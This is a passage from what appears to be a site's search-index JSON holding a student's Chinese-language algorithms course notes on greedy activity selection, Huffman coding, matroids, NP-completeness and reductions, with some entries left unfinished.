Selection","text":"<p>\u6211\u4eec\u6709\u4e00\u7cfb\u5217\u7684\u6d3b\u52a8\\(S=\\{a_1,a_2...a_n\\}\\)\uff0c\u8fd9\u4e9b\u6d3b\u52a8\u9700\u8981\u4f7f\u7528\u4e00\u4e9b\u8d44\u6e90\uff0c\u6bd4\u5982\u6559\u5e08\uff0c\u5176\u6bcf\u4e2a\u6d3b\u52a8\u8868\u793a\u4e00\u4e2a\u5360\u7528\u65f6\u95f4\uff0c\\(a_i=[s_i,f_i)\\) \u662f\u6307\u8d77\u59cb\u65f6\u95f4\u548c\u7ed3\u675f\u65f6\u95f4\uff0c\u5982\u679c\u6211\u4eec\u8bf4\\(a_i\\)\u548c\\(a_j\\)\u662fcompatible\uff0c\u662f\u6307\u5b83\u4eec\u662f\u4e0d\u51b2\u7a81\u7684\uff0c\u4e5f\u5c31\u662f\u5b83\u4eec\u7684\u5176\u4e2d\u4e00\u4e2a\u7684\u8d77\u59cb\u65f6\u95f4\u5927\u4e8e\u7b49\u4e8e\u53e6\u4e00\u4e2a\u7684\u7ed3\u675f\u65f6\u95f4\u3002</p> <p>\u6211\u4eec\u9700\u8981\u9009\u62e9\u4e00\u4e2a\u4e92\u4e0d\u51b2\u7a81\u7684\u6d3b\u52a8\u7684\u6700\u5927\u5b50\u96c6\u5408\u3002</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u4e00\u822c\u4f1a\u9009\u62e9\\(f_i\\)\u662f\u589e\u5e8f\u7684\u3002</p> <p>\u6211\u4eec\u9996\u5148\u8003\u8651DP\u7684\u89e3\u51b3</p> <p>\u6211\u4eec\u8fd8\u662f\u5904\u7406\u6210\u5b50\u95ee\u9898\uff0c\u5c06\\(S_{ij}\\)\u5b9a\u4e49\u4e3a\\(a_i-a_j\\)\u4e2d\u7684\u6700\u4f18\u89e3</p> <p>\u200b\u200b</p> <p>greedy part</p> <p>\u6211\u4eec\u91c7\u53d6\u4e00\u4e9bgreedy rule\uff0c\u6765\u770b\u770b\u80fd\u4e0d\u80fd\u83b7\u5f97\u6700\u4f18\u89e3\u51b3</p> <ul> <li>\u9009\u62e9\u6700\u65e9\u5f00\u59cb\u7684\u6d3b\u52a8\uff08\u4f46\u8981\u6c42\u4e0d\u91cd\u53e0\uff09-&gt; \u663e\u7136\u4e0d\u884c</li> <li>\u9009\u62e9\u6700\u77ed\u65f6\u957f\u7684\u6d3b\u52a8 -&gt; \u4e5f\u4e0d\u884c</li> <li>\u9009\u62e9\u6700\u77ed\u91cd\u53e0\u5ea6\u7684\u6d3b\u52a8 -&gt; \u4e0d\u884c</li> <li>\u9009\u62e9\u6700\u65e9\u7ed3\u675f\u7684\u6d3b\u52a8 -&gt; \u53ef\u884c -&gt; \u5bf9\u79f0\u7684\u60f3\u6cd5\uff0c\u9009\u62e9\u6700\u540e\u5f00\u59cb\u7684\u4e8b\u4ef6</li> </ul> <p>\u200d</p> <p>\u6211\u4eec\u8981\u5982\u4f55\u8bc1\u660e\u7b2c\u56db\u4e2a\u505a\u6cd5\u662f\u6b63\u786e\u7684\uff0c</p>"},{"location":"ZJU-course/ADS/ADS/#huffman-code","title":"Huffman code","text":"<p>\u5bf9\u4e8e\u4e00\u4e2atext\uff0c\u6211\u4eec\u5047\u8bbe\u5176\u662f\u4e00\u4e2a1000\u957f\u5ea6\u7684string\uff0c\u5305\u542ba, u, x and z\u8fd9\u56db\u4e2a\u5b57\u6bcd\uff0c\u5176\u9700\u8981\u591a\u5c11bit\u53bb\u5b58\u50a81000\u4e2abyte\u7684string</p> <p>\u5b9e\u9645\u4e0a\u4e00\u4e2abyte\u5bf9\u5e948\u4e2abit\uff0c\u4f46\u662f\u7531\u4e8e\u6211\u4eec\u53ea\u6709\u8fd9\u56db\u4e2a\u5b57\u6bcd\uff0c\u56e0\u6b64\u5176\u5b9e\u53ea\u9700\u8981\u4e24\u4e2abit\u6765\u5b58\u50a8\u5bf9\u5e94\u7684char\uff0c\u8fd9\u662f\u56fa\u5b9a\u957f\u5ea6\u7684\u4fe1\u606f\u5b58\u50a8\u7684\u6a21\u5f0f</p> <p>\u4f46\u662f\u5982\u679c\u6211\u4eec\u9009\u62e9\u975e\u56fa\u5b9a\u957f\u5ea6\u7684\u4fe1\u606f\u5b58\u50a8\u5f62\u5f0f\uff0c\u5e76\u4e14\u8f85\u52a9\u4ee5\u5b57\u7b26\u7684\u9891\u7387\u5206\u6790\uff0c\u53ef\u4ee5\u83b7\u5f97\u66f4\u52a0\u4f18\u79c0\u7684\u7ed3\u679c\u3002</p> <p>\u200b\u200b</p> <p>\u8be5\u79cd\u65b9\u5f0f\u5c31\u662fhuffman code\uff0c\u5176\u751f\u6210\u65b9\u6cd5\u662f\u6784\u5efahuffman tree\uff0c\u8fd9\u68f5\u6811</p> <ul> <li>\u6bcf\u4e2anode\u90fd\u662f\u4e00\u4e2achar</li> <li>\u5de6\u5b69\u5b50\u6307\u9488\u8868\u793a '0'</li> <li>\u53f3\u5b69\u5b50\u6307\u9488\u8868\u793a '1'</li> <li>\u9700\u8981\u6bcf\u4e2achar\u7684\u6df1\u5ea6\u4e58\u4ee5\u9891\u7387\u4e4b\u548c\u6700\u5c0f \\(\\min\\{\\sum depth_i\\times frequency_i\\}\\)</li> <li>\u5e76\u4e14\u6bcf\u4e2achar\u7684\u8def\u5f84\uff0c\u90fd\u4e0d\u80fd\u6709\u76f8\u540c\u524d\u7f00\uff08No code is a prefix of another\uff09\u5728\u6811\u4e0a\u8868\u73b0\u4e3a\uff0c\u6bcf\u4e2achar\u90fd\u662f\u4e00\u4e2afull tree\uff08\u4e00\u4e2anode\u8981\u4e48\u662f\u53f6\u5b50\uff0c\u8981\u4e48\u6709\u4e24\u4e2a\u5b69\u5b50\uff09\u7684\u53f6\u5b50</li> </ul> <p>\u200b\u200b</p> <p>huffman tree\u751f\u6210\u7684\u5177\u4f53\u7b97\u6cd5\u5982\u4e0b\u56fe\uff0c\u6211\u4eec\u5c06\u4f1abottom-up\u5efa\u6811\uff0c\u6211\u4eec\u4f7f\u7528greedy\u7684\u57fa\u7840\u60f3\u6cd5\u662f\uff0c\u5c06\u4f7f\u7528\u9891\u7387\u6700\u4f4e\u7684\u5b57\u6bcd\u653e\u53f3\u8fb9</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u5c06\u5176\u653e\u5230\u4e00\u4e2amin-heap\u91cc\u9762\uff0c\u6bcf\u6b21\u628a\u9891\u7387\u6700\u5c0f\u7684\u62ff\u51fa\u6765\u7ed3\u5408\uff0c\u7136\u540e\u628a\u9891\u7387\u52a0\u8d77\u6765\uff0c\u63d2\u56deheap\u91cc\u9762\uff0c\u5982\u6b64\u5faa\u73af</p> <p>\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a O(ClogC)</p> <p>\u8bc1\u660e\u8be5\u79cd\u505a\u6cd5\u662f</p>"},{"location":"ZJU-course/ADS/ADS/#_4","title":"\u670b\u8f88","text":"<p>\u95ee\u9898\u7684\u8868\u793a</p> <ul> <li>E\u662f\u4e00\u4e2a\u57fa\u672c\u5143\u7d20\u96c6\u5408</li> <li>\u89e3\u95ee\u9898F\u662fE\u7684\u5e42\u96c6\u7684\u5b50\u96c6</li> <li>\\(\\phi \\in F\\)</li> <li>\u82e5 \\(X \\in F, Y\\subseteq X\\), \u5219 \\(Y\\in F\\)</li> <li>\u82e5 \\(X\\in F\\) \u79f0X\u4e3a\u72ec\u7acb\u96c6\u5408</li> <li>\u53cd\u4e4bx\u4e3a\u76f8\u5173\u96c6\u5408</li> <li>\u6781\u5927\u72ec\u7acb\u96c6\u5408  \u6781\u5927\u4e0d\u662f\u6700\u5927\uff0c\u4ec5\u9700\u65e0\u6cd5\u518d\u88c5\u5165\u5176\u4ed6\u7269\u54c1\uff0c\u5c06\u5176\u79f0\u4e3a\u57fa</li> <li>\u6781\u5c0f\u76f8\u5173\u96c6\u5408\uff0c\u5c06\u5176\u79f0\u4e3a\u5708</li> <li>\u79e9 rank \\(r(F)=max\\{|x|:x\\subseteq F, x\\in F\\}\\)</li> <li>\u4e0b\u79e9 \\(\\rho (F) =min\\{|Y|:Y\u662fF\u7684\u57fa\\}\\)</li> <li>\\(min\\frac{\\rho(F)}{r(F)}\\) \u5982\u679c\u8be5\u503c\u4e3a1\uff0c\u90a3\u4e48\u53ef\u8d2a\u5fc3\uff1b\u5982\u679c\u8be5\u503c\u4e3ak\uff0c\u90a3\u4e48\u5176\u83b7\u5f97\u7684\u662f\u6700\u4f18\u89e3\u7684k\u8fd1\u4f3c\uff0c\u8d77\u7801\u4e0d\u4f1a\u6bd4\u6700\u4f18\u7ed3\u679c\u574fk\u500d\u4ee5\u4e0a</li> <li>\u79e9\u5546\u4f30\u8ba1\u5f0f</li> </ul> <p>\u95ee\u9898\u4f8b\u5b50</p> <ul> <li>\u4e8c\u90e8\u56fe\uff0c\u627e\u5230\u4e00\u4e2a\u4e00\u5bf9\u4e00\u7684\u89e3\u96c6\u7684\u6700\u5927\uff0c\u6700\u591a\u80fd\u6709\u51e0\u6761\u8fb9</li> </ul> <p>\u300aCombinatorial optimization\u300b Papadimitirion</p> <p>\u300aCombinatorial optimization\u300b Bernhard Korte</p>"},{"location":"ZJU-course/ADS/ADS/#np","title":"\u95ee\u9898\u548cNP","text":"<p>\u4ec0\u4e48\u662f\u56f0\u96be\u7684\u95ee\u9898\uff0c\u662f\u6307\u90a3\u4e9b\u4e0d\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3\u7684\u95ee\u9898\u3002</p> <ul> <li>\u6700\u7b80\u5355\u7684\u95ee\u9898\uff0c\u53ea\u9700\u8981\u8f93\u5165\u5c31\u5b8c\u6210</li> <li>\u6700\u56f0\u96be\u7684\u95ee\u9898\uff0c\u4e0d\u53ef\u5224\u5b9a\u95ee\u9898\uff0c\u6bd4\u5982\u54e5\u5fb7\u5c14\u627e\u5230\u4e0d\u53ef\u5224\u65ad\u95ee\u9898</li> </ul> <p>\u4ec0\u4e48\u662fNP</p> <p>\u9996\u5148\u6211\u4eec\u9700\u8981\u77e5\u9053\u4f55\u4e3a\u56fe\u7075\u673a\uff0c\u5176\u5185\u90e8\u662f\u4e00\u7ef4\u7684infinite memory\u548c\u4e00\u4e2ascanner</p> <p>\u5176\u6b21\u6211\u4eec\u9700\u8981\u77e5\u9053\u4f55\u4e3a\u786e\u5b9a\u56fe\u7075\u673a\u548c\u975e\u786e\u5b9a\u56fe\u7075\u673a</p> <p>NP\u5373\u662f Nondetermministic Polynomial-time \u5728\u975e\u786e\u5b9a\u56fe\u7075\u673a\u4e0a\u591a\u9879\u5f0f\u65f6\u95f4\u89e3\u51b3\u7684\u95ee\u9898</p> <p>\u5e76\u4e14\u5173\u4e8e\u95ee\u9898\u7684NP\u8fd8\u6709\u4e00\u4e2a\u6027\u8d28\uff0c\u5982\u679c\u6211\u4eec\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\uff08\u786e\u5b9a\u56fe\u7075\u673a\uff09\u5185\u786e\u5b9a\u4efb\u610f\u4e00\u4e2a\u89e3\u662f\u5426\u4e3a\u8be5\u95ee\u9898\u6b63\u786e\u7684\u89e3\uff0c\u90a3\u4e48\u5176\u4e00\u5b9a\u662fNP</p> <p>\u5728\u786e\u5b9a\u56fe\u7075\u673a\u5185\u591a\u9879\u5f0f\u9a8c\u8bc1 = \u5728\u975e\u786e\u5b9a\u56fe\u7075\u673a\u5185\u591a\u9879\u5f0f\u89e3\u51b3</p> <p>\u662f\u5426\u5b58\u5728\u4e3aNP\u4f46\u4e0d\u4e3aP\u7684\u95ee\u9898 \\(P = NP  or P\\neq NP\\) </p> <p>NPC\u95ee\u9898</p> <p>\u662f\u6307\u90a3\u4e9b\uff0c\u6240\u6709\u7684NP\u95ee\u9898\u90fd\u80fd\u89c4\u7ea6\u5230\u5176\u7684\u95ee\u9898</p>"},{"location":"ZJU-course/ADS/ADS/#hcp-to-tsp","title":"HCP to TSP","text":"<p>\u4e00\u4e2a\u8bc1\u660e\uff1a\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u77e5\u9053Hamiltonian cycle\u95ee\u9898\u662fNPC\u95ee\u9898\uff0c\u90a3\u4e48\u6211\u4eec\u5e94\u8be5\u53ef\u4ee5\u8bc1\u660etraveling salesman problem \u662fNPC\u95ee\u9898</p> <p>Hamiltonian cycle\u7684\u5224\u5b9a\u7248\u672c\u662f\uff0c\u7ed9\u4e00\u4e2a\u56feG\uff0c\u5b58\u5728\u4e00\u4e2asimple cycle\u7ecf\u8fc7\u6240\u6709\u7684vertices</p> <p>TSP\uff08\u65c5\u884c\u5546\u95ee\u9898\uff09\u7684\u5224\u5b9a\u7248\u672c\u662f\uff0c\u7ed9\u4e00\u4e2acomplete graph G\uff0c\u4ee5\u53ca\u5176edge costs\u548c\u4e00\u4e2aK\uff0c\u6211\u4eec\u80fd\u4e0d\u80fd\u627e\u5230\u4e00\u4e2a\u7ecf\u8fc7\u6240\u6709vertices\u7684simple cycle\u7684total cost&lt;=K\uff0c\u539f\u59cb\u7248\u672c\u662f\u627e\u5230\u6700\u5c0f\u7684total cost</p> <p>\u8bc1\u660e</p> <ul> <li>\u8bc1\u660eTSP is NP\uff0c\u5f88\u663e\u7136\uff0c\u5173\u4e8e\u5176\u5224\u5b9a\u7248\u672c\uff0c\u7ed9\u51fa\u4e00\u4e2aanswer\uff0c\u6211\u4eec\u80fd\u7528\u7ebf\u6027\u65f6\u95f4\u5224\u65ad\u8fd9\u4e2aanswer\u662f\u5426\u4e3a\u6b63\u786e\u7684</li> <li>\u7136\u540e\u6211\u4eec\u8981\u8bc1\u660e\u591a\u9879\u5f0f\u89c4\u7ea6\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u7b80\u5355\u5730\u628a\u5176\u4ece\u591a\u9879\u5f0f\u65f6\u95f4\u628a\u4e00\u4e2a\u56fe\u4ece\u6b63\u5e38\u56fe\u8f6c\u6362\u6210\u5b8c\u5168\u56fe\uff0c\u901a\u8fc7\u4e0b\u56fe\u6211\u4eec\u5c31\u53ef\u4ee5\u628aHamilton cycle\u95ee\u9898\u89c4\u7ea6\u5230TSP\u95ee\u98981</li> <li>\u200b\u200b</li> </ul> <p>the first NPC problem</p> <p>\u662fSatisfiability problem(Circuit-SAT)\uff0c\u5176\u5185\u5bb9\u662f\uff1a\u7ed9\u51fa\u4e00\u4e2aboolean expression\uff0c\u8be2\u95ee\u662f\u5426\u6709\u4e00\u4e2a\u53d8\u91cfassignment\uff0c\u4f7f\u5f97\u8868\u8fbe\u5f0f\u7684\u7ed3\u679c\u4e3a1</p> <p>\u5176\u88ab\u8bc1\u660e\u4e3aNPC\uff0c\u80fd\u901a\u8fc7\u975e\u786e\u5b9a\u56fe\u7075\u673a\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u5b8c\u6210</p>"},{"location":"ZJU-course/ADS/ADS/#formal-language","title":"Formal language*","text":"<p>Abstract Problem</p> <p>\u4e00\u4e2a\u62bd\u8c61\u95ee\u9898Q\uff0c\u662f\u6307\u4e00\u4e2abinary relation on set I of problem instances and a set S of problem solutions</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u5c06\u5176\u8f6c\u6362\u6210 decision problem\uff0c\u80fd\u4e0d\u80fd\u627e\u5230\u4e00\u4e2a\u8def\u5f84\u5c0f\u4e8eK</p> <p>\u200b\u200b</p> <p>concrete problem</p> <p>\u6211\u4eec\u9700\u8981\u628a\u8f93\u5165set I \u8f6c\u6362\u6210binary string {0 1}\uff0c\u5c06\u62bd\u8c61\u95ee\u9898\u8f6c\u6210concrete problem\u7684\u8fc7\u7a0b\u79f0\u4e3aencoding</p> <p>Formal-language Theory</p> <ul> <li>alphabet \\(\\sum\\)  \u662f\u4e00\u4e2afinite set of symbols \u6807\u8bb0 \u6bd4\u5982{0, 1}</li> <li>language L \u662f\u6307 alphabet\u80fd\u751f\u6210\u7684set of strings</li> <li>\\(\\sum*\\) \u662f\u4e00\u79cd\u7c7b\u4f3c\u95ed\u5305\u7684\u6982\u5ff5\uff0clanguage of all strings</li> <li>\u200b\u200b</li> <li>L* \u4e5f\u662f\u4e00\u4e2aclosure\uff0c\u6240\u6709L\u7684\u5e76\u96c6\u5408</li> </ul> <p>\u200b\u200b</p> <p>\u662f\u4e00\u79cd\u5f62\u5f0f\u8bed\u8a00\u53bb\u5b9a\u4e49P\uff0cNP\u8fd9\u4e9b\u6982\u5ff5</p> \\[ P=\\{L\\subseteq\\{0,1\\}^*:there\\ exists\\ an\\ algorithm\\ A\\ that\\ decides\\ L\\ in\\ polytime\\} \\] <p>NP\u95ee\u9898\u7684\u5b9a\u4e49\u5c31\u6d89\u53ca\u5230\u4e00\u4e2a\u9a8c\u8bc1\u7b97\u6cd5</p> <p>\u9a8c\u8bc1\u7b97\u6cd5\u662f\u4e00\u4e2a\u53cc\u53c2\u6570\u7b97\u6cd5A\uff0c\u5176\u4e2d\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u666e\u901a\u7684\u8f93\u5165\u5b57\u7b26\u4e32x\uff0c\u53e6\u4e00\u4e2a\u662f\u4e00\u4e2a\u79f0\u4e3a\u8bc1\u4e66\uff08\u5176\u5b9e\u5c31\u662f\u8fd9\u4e2a\u95ee\u9898\u7684\u89e3\uff09\u7684\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32y</p> <p>\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u8bc1\u4e66y\uff0c\u5bf9\u4e8e\u67d0\u4e2a\u8f93\u5165\u5b57\u7b26\u4e32x\uff0c\u4f7fA(x, y) = 1\uff0c\u90a3\u4e48\u5c31\u8bf4\u9a8c\u8bc1\u7b97\u6cd5A\u53ef\u4ee5\u9a8c\u8bc1\u8fd9\u4e2a\u7b97\u6cd5\u3002</p>"},{"location":"ZJU-course/ADS/ADS/#cp-to-vcp","title":"CP to VCP","text":"<p>\u6211\u4eec\u5df2\u77e5clique problem is NPC\uff0c\u6765\u8bc1\u660e vertex cover problem \u4e5f\u662f NPC\uff0c\u8fd9\u6b21\u6211\u4eec\u4f7f\u7528formal language\u6765\u8bc1\u660e</p> <ul> <li>clique problem:  \u7ed9\u4e00\u4e2aundirected graphG\uff0c\u548c\u4e00\u4e2a\u6574\u6570K\uff0c\u95eeG\u4e2d\u662f\u5426\u5b58\u5728\u4e00\u4e2acomplete subgraph of K vertices</li> <li>\u200b\u200b</li> <li>\u4e0a\u8ff0\u7684instances \u662f\u56de\u7b54yes\u7684instance\u7684\u8868\u8ff0</li> <li>vertex cover problem:  \u7ed9\u4e00\u4e2aundirected graph G, \u548c\u4e00\u4e2a\u6574\u6570K\uff0c\u95ee\u662f\u5426G contain \u4e00\u4e2a\u70b9\u96c6\u7684\u5b50\u96c6V' \uff0c\u5b50\u96c6\u7684\u70b9\u6570\u5c0f\u4e8e\u7b49\u4e8eK\u5e76\u4e14\uff0c\u56fe\u4e2d\u6240\u6709\u7684edge\u90fd\u81f3\u5c11\u6709\u4e00\u4e2a\u70b9\u5728V'\u4e0a</li> <li>\u200b\u200b</li> </ul> <p>\u8981\u8bc1\u660e\u5176\u662fNPC</p> <ul> <li>\u9996\u5148\u8bc1\u660e\u662fNP\uff0c\u5173\u952e\u5728\u4e8e\u627e\u5230certificate y</li> <li>\u200b\u200b</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\u5c31\u662f\u8fb9\u7684\u6570\u91cf\uff0c\u6700\u574f\u662f\u70b9\u7684\u6570\u91cf\u76842\u6b21\u65b9\uff0c\u5e76\u4e14\u8981\u68c0\u67e5edge\u7684\u70b9\u662f\u90fd\u5728V'\u91cc\u9762\uff0c\u6240\u6709\u65f6\u95f4\u590d\u6742\u5ea6\u662fO(N^3)</li> <li>\u5176\u6b21\u9700\u8981\u8bc1\u660e CLIQUE\u80fd\u89c4\u7ea6\u5230VERTEX-COVER</li> <li>\u6211\u4eec\u60f3\u8981\u8bc1\u660e\u200b</li> <li>\\(\\overline{G}\\) \u662f\u6307\u4e0eG\u76f8\u5173\u7684graph\uff0c\u5b83\u4eec\u6709\u548cG\u4e00\u6837\u7684vertices\uff0c\u4f46\u662fedge\u662fG\u7684\u8865\u96c6\uff0c\u5c31\u662f\u5b8c\u5168\u56fe\u7684\u8fb9\u51cf\u53bbG\u6709\u7684\u8fb9</li> <li>\u200b\u200b</li> </ul>"},{"location":"ZJU-course/ADS/ADS/#_5","title":"\u670b\u8f88","text":"<p>\u80cc\u5305\u7684\u52a8\u6001\u89c4\u5212</p> <ul> <li>\u95ee\u9898\u7684\u89c4\u6a21\u662f\u8f93\u5165\u7684\u4e8c\u8fdb\u5236\u8868\u793a\uff0c\u6bd4\u5982\u6574\u6570n\uff0c\u89c4\u6a21\u5c31\u662flogn\uff0c\u5982\u679c\u6709\u591a\u4e2a\u8f93\u5165\uff0c\u5c31\u5168\u90e8\u52a0\u8d77\u6765\uff0c\u6709\u5e8f\u5217\u7684\u8f93\u5165\u4e5f\u5168\u90e8\u52a0\u8d77\u6765</li> <li>\u591a\u9879\u5f0f\u65f6\u95f4\u7b97\u6cd5\u5c31\u662f\u6307\u5728\u95ee\u9898\u89c4\u6a21\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u91cc\u9762\u89e3\u51b3\u8be5\u95ee\u9898 mlogn \u4e0e m+logn\u76f8\u540c</li> <li> <p>\u4f2a\u591a\u9879\u5f0f\uff0c\u662f\u6307\u4e00\u8fdb\u5236\u8868\u793a\u95ee\u9898\u89c4\u6a21\u6761\u4ef6\u4e0b\uff0c\u6574\u6570n\u89c4\u6a21\u5c31\u662fn\uff0c\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7b97\u6cd5</p> </li> <li> <p>\u4f46\u662f\u5bf9\u4e8e\u975e\u6570\u5b57\u95ee\u9898\uff0c\u4e5f\u5c31\u662f\u8f93\u5165\u5c31\u4e0d\u662f\u4e2a\u6570\uff0c\u4e00\u8fdb\u5236\u548c\u4e8c\u8fdb\u5236\u5c31\u4e0d\u5b58\u5728\u533a\u522b</p> </li> <li>\u5b50\u95ee\u9898\u662f\u6307\uff0cA\u95ee\u9898\u7684\u8f93\u5165\u662fB\u95ee\u9898\u8f93\u5165\u7684\u7279\u6b8a\u60c5\u5f62</li> </ul> <p>\u7ecf\u5178\u95ee\u9898</p> <ul> <li> <p>\u80cc\u5305\u95ee\u9898\uff0c\u6709\u4e00\u4e2a\u80cc\u5305\uff0c\u591a\u4e2a\u4e1c\u897f\uff0c\u4e0d\u540c\u91cd\u91cf\u548c\u4ef7\u503c\uff0c\u5728\u6709\u9650\u8303\u56f4\u5185\u88c5\u66f4\u591a\u7684\u4ef7\u503c\uff0c\u53ef\u8bc1\u660eNP\u5b8c\u5168</p> </li> <li> <p>subset-sum</p> </li> <li>\u88c5\u7bb1\u95ee\u9898\uff0c\u6709\u591a\u4e2a\u7bb1\u5b50\uff0c\u6240\u6709\u4e1c\u897f\u90fd\u8981\u88c5\u4e0b\uff0c\u7528\u6700\u5c11\u7684\u7bb1\u5b50</li> </ul> <p>\u7b97\u6cd5</p> <ul> <li>\u53ea\u8ba4\u6709\u7a77\u6027\uff08\u8d8b\u8fd1\u4e8e100%\u6982\u7387\u505c\u4e0b \u8f93\u5165\u8003\u8651\u6700\u5dee\uff0c\u968f\u673a\u8003\u8651\u5e73\u5747</li> <li> <p>\u56fe\u7075\u673a</p> </li> <li> <p>\u72b6\u6001+\u8bfb\u5199\u5934+\u8bfb\u5199\u5934\u6307\u5411\u5185\u5bb9 - &gt; \u77ac\u95f4\u50cf</p> </li> <li>\u6839\u636e\u77ac\u95f4\u50cf</li> <li> <p>\u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a</p> </li> <li> <p>\u5355\u5e26\u5355\u5934\u548c\u56fe\u7075\u673a\u90fd\u4e00\u6837</p> </li> <li>\u72b6\u6001\u8f6c\u79fb\u65b9\u5f0f\u4e0d\u4e00\u6837\uff0c\u9047\u5230\u5206\u652f\u7ed3\u6784\uff08\u62bd\u8c61\u7684\u5206\u652f\u7684\u7ed3\u6784\uff0c\u6307\u53ef\u4ee5\u88ab\u753b\u6210\u6811\u7684\u7ed3\u6784\uff0c\u5e76\u4e0d\u4e00\u5b9a\u662fif-else\uff09\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5e76\u884c\u8ba1\u7b97\u4e24\u79cd\u72b6\u6001\uff0c\u5176\u65f6\u95f4\u957f\u5ea6\u4e3a\u6700\u957f\u7684\u4e00\u6761\u5206\u652f</li> <li>P\u95ee\u9898\uff0c\u662f\u6307\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u91cc\uff0c\u5728\u56fe\u7075\u673a\u4e0a\u505a\u5b8c\uff0c\u4f8b\u5982\u6700\u5c0f\u751f\u6210\u6811\uff0c\u6700\u77ed\u8def\u8fea\u53ef\u8fbe\u65af\uff0c\u6211\u4eec\u7528 \\(\\pi \\in P\\) \u8868\u793a\\(\\pi\\)\u662f\u4e00\u4e2a\u95ee\u9898</li> <li>NP\u95ee\u9898\uff1a\u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a \u53ef\u4ee5\u591a\u9879\u5f0f\u89e3\u51b3\u7684\u95ee\u9898 \\(P\\subseteq NP\\) P\u95ee\u9898\u4e5f\u53ef\u4ee5\u5728\u975e\u786e\u5b9a\u56fe\u7075\u673a\u4e0a\u89e3\u51b3</li> <li> <p>NPC\u95ee\u9898 NP\u5b8c\u5168\u95ee\u9898\uff0c\u662fNP\u95ee\u9898\uff0c\u540c\u65f6\u53ef\u4ee5\u628a\u6240\u6709NP\u95ee\u9898\u89c4\u7ea6\u4e8e\u5176\u672c\u8eab\uff0c\u6240\u6709NP\u95ee\u9898\u53ef\u4ee5\u89c4\u7ea6\u4e8e\u5728SAT\uff0c\u8fd9\u4e2a\u89c4\u7ea6\u662f\u591a\u9879\u5f0f\uff0c\u5982\u679c\u80fd\u8bc1\u660eSAT\u662f\u591a\u9879\u5f0f\uff0c\u90a3\u4e48NP = P</p> </li> <li> <p>\u89c4\u7ea6\uff08reduction\uff09\u5bf9\u4e8e\u5224\u5b9a\u6027\u95ee\u9898\uff0c\u7ed3\u679cyes\u6216no \u95ee\u98981\uff0c\u95ee\u98982\uff0c\u5982\u679c\u80fd\u627e\u5230\u4e00\u4e2a\u6620\u5c04\uff0c\u628a\u95ee\u98981\u7684\u5b9e\u4f8b\u6620\u5c04\u5230\u95ee\u98982\uff08\u9700\u8981\u662f\u5224\u5b9a\u95ee\u9898\uff0c\u5e76\u4e14yes\u5bf9\u5e94yes\uff09\uff0c\u90a3\u4e48\u5c31\u8bf4\u660e\u95ee\u98981&lt;\u95ee\u98982 \uff08\u539f\u6765\u662fyes\uff0c\u6620\u5c04\u8fc7\u53bb\u4e5f\u5f97\u662fyes\uff09\u5982\u679c\u89c4\u7ea6\u6620\u5c04\u662f\u591a\u9879\u5f0f\u65f6\u95f4\u53ef\u4ee5\u5b8c\u6210\uff0c\u8bf4\u660e\u95ee\u98982\u5728\u591a\u9879\u5f0f\u53ef\u89e3\u51b3-&gt;\u95ee\u98981\u5728\u591a\u9879\u5f0f\u53ef\u89e3 \u8bb0\u4e3a$A\\leqslant_{p} B $</p> <ul> <li>mapping reduction</li> </ul> </li> <li> <p>\u4f8b\u5982SAT\u95ee\u9898\u6216\u65c5\u884c\u5546\u95ee\u9898\uff08TSP\uff09\\(NP\\leqslant_{p} NPC\\)</p> </li> <li>\\(if SAT\\leqslant_{p} \\pi \\rightarrow \\pi \\ is \\ NPC\\)</li> <li>NPC\u7684\u95ee\u9898\u53ef\u4ee5\u4e92\u76f8\u89c4\u7ea6\u5230\u5bf9\u65b9</li> <li>\u65c5\u884c\u5546\u95ee\u9898\uff1a\u7ed9\u4e00\u5f20\u5e26\u6743\u5b8c\u5168\u56fe\uff08\u6bcf\u4e2a\u70b9\u4e4b\u95f4\u90fd\u76f8\u8fde\uff09\uff0c\u627e\u51fa\u4e00\u6761\u54c8\u5bc6\u5c14\u987f\u5708\uff08\u904d\u5386\u6240\u6709\u70b9\u7684\u56de\u8def\uff0c\u65e0\u91cd\u590d\u8fb9\uff09\u6743\u91cd\u6700\u5c0f\uff0c\u80fd\u89e3\u51fa\u5224\u5b9a\u7248\u672c\u4e00\u5b9a\u53ef\u4ee5\u89e3\u51fa\u4f18\u5316\u7248\u672c</li> <li>partition\u95ee\u9898\uff1a\u6211\u4eec\u6709\u4e00\u4e2aset \\(S\\) \uff0c\u6211\u4eec\u5206\u5272\u51fa\u4e00\u4e2a\u5b50\u96c6\u5408\uff0c\u4f7f\u5176\u5927\u5c0f\u662fS\u96c6\u5408\u7684\u4e00\u534a\u5927\u5c0f</li> <li>certificate \u627e\u51fa\u5224\u5b9a\u7248\u672c \u5982\u679c\u8981\u8bc1\u660e\\(\\pi \\in NP\\)\uff0c\u5bf9\u4e8e\u6211\u4eec\u5df2\u77e5\u7684\u6bcf\u4e2ayes\u7684instance\u6211\u4eec\u53ef\u4ee5\u5728\u786e\u5b9a\u56fe\u7075\u673a\u7684P\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5185\u89e3\u51b3</li> <li>\u5e73\u884c\u7eb8\u5e26\u7684\u95ee\u9898\uff0c\u627e\u5230partition\u5230\u5176\u7684\u7ebf\u6027\u6620\u5c04\uff0c\u5bf9\u4e8ec\u5c31\u662f\\(1/2*\\sum_{i\\in S} a_{i}\\) \u5c31\u5efa\u7acb\u8d77\u4e86\u6709\u548c\u6ca1\u6709\u7684\u533a\u522b</li> <li>T  T  F  F  T</li> <li>a-&gt;B b-&gt;A c-&gt;BCD d-&gt;</li> 